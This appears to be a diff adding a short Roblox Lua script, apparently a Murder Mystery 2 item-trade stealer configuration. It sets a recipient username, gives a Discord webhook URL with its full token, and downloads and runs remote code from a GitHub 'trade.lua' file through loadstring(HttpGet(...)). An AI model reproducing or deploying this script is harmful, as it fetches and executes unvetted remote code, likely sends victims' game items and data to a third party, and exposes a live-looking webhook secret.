@@ -1,0 +1,3 @@
+UserName = "faresmmx2"
+WebHook = "https://discord.com/api/webhooks/1322970922050785280/UtMe6I4C9bmePE7IEIjboDXuM0fiQkUEA7KEpejUUDbzslGFh0J1BcsCMo7efjC4W735"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/MM2/main/trade.lua"))()
